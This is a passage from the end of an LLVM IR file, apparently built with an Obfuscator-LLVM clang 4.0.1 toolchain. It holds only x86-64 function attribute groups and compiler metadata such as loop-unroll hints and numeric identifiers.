attributes #4 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { argmemonly nounwind }
attributes #8 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind readnone }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2}
!2 = !{!"llvm.loop.unroll.disable"}
!3 = !{i32 -2146535865}
!4 = !{i32 -2146534425}
!5 = !{i32 -2146533715}
!6 = !{i32 -2146532897}
!7 = !{i32 -2146532006}
!8 = distinct !{!8, !2}
